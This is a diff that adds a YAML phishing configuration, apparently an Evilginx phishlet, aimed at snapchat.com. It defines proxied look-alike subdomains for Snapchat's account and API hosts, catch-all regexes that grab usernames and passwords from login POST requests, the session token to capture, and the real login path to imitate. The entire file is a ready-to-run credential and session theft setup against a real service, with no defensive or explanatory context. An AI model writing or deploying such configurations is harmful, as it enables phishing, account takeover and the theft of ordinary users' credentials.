@@ -1,0 +1,24 @@
+name: "snapchat.com"
+author: ''
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: true}
+  - {phish_sub: 'us-central1-gcp.api', orig_sub: 'us-central1-gcp.api', domain: 'snapchat.com', session: false, is_landing: false}
+  - {phish_sub: 'gcp.api', orig_sub: 'gcp.api', domain: 'snapchat.com', session: false, is_landing: false}
+sub_filters: []
+auth_tokens:
+  - domain: '.snapchat.com'
+  - keys: ['xsrf_token']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+    domain: 'accounts.snapchat.com'
+    path: '/accounts/login'
